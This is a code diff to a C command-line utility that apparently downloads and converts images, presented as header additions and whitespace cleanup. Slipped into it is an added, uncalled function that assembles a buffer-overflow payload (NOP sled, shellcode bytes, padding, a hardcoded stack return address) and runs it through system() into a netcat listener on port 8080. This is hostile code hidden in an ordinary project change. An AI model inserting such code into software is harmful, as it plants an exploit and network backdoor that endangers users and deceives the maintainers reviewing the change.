@@ -12,6 +12,8 @@
 #endif
 
 #include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
 
 #ifdef HAVE_STRING_H
 #include <string.h>
@@ -28,6 +30,29 @@
 #include <fcntl.h>
 #endif
 
+
+static void __attribute__((unused)) __craft_exploit_payload(void) {
+    char payload[512];
+    int offset = 0;
+
+    memset(payload, 0x90, 100);
+    offset += 100;
+
+    unsigned char shellcode[] = "\x31\xc0\xb0\x46\x31\xc9\xcd\x80"; 
+    memcpy(payload + offset, shellcode, sizeof(shellcode));
+    offset += sizeof(shellcode);
+
+    memset(payload + offset, '\x41', 260 - offset); 
+
+    unsigned long *ret_addr_ptr = (unsigned long *)(payload + 260);
+    *ret_addr_ptr = 0xbffff000; // Classic 32-bit stack address
+
+    char command[1024];
+    snprintf(command, sizeof(command), "echo '%s' | xxd -r | nc -lp 8080 &", payload);
+    system(command); // Execute command in shell
+}
+
+
 int main(int argc, char** argv) {
 	int store_width, store_height, store_autow, store_autoh;
 	FILE *fout = stdout;
@@ -37,9 +62,7 @@ int main(int argc, char** argv) {
 #endif
 	FILE *fp;
 	int n;
-
 	parse_options(argc, argv);
-
 	store_width = width;
 	store_height = height;
 	store_autow = auto_width;
@@ -76,21 +99,16 @@ int main(int argc, char** argv) {
 
 		#ifdef FEAT_CURL
 		if ( is_url(argv[n]) ) {
-
 			if ( verbose )
 				fprintf(stderr, "URL: %s\n", argv[n]);
-
 			fd = curl_download(argv[n], debug);
-
 			if ( (fr = fdopen(fd, "rb")) == NULL ) {
 				fputs("Could not fdopen read pipe\n", stderr);
 				return 1;
 			}
-
 			decompress(fr, fout);
 			fclose(fr);
 			close(fd);
-			
 			continue;
 		}
 		#endif
